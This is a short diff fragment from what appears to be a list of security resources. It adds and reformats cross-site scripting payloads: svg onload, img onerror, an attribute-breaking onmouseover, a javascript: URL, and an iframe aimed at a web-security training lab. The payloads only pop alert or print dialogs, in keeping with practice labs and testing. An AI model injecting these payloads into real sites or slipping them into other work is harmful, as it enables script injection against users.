@@ -5,4 +5,5 @@ Threatspec  -- https://onehack.us/t/threatspec-continuous-threat-modeling-throug
 "><svg onload=alert(1)>
 <img src=1 onerror=alert(1)>
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-  "onmouseover="alert(1)
+"onmouseover="alert(1)
+javascript:alert(1)
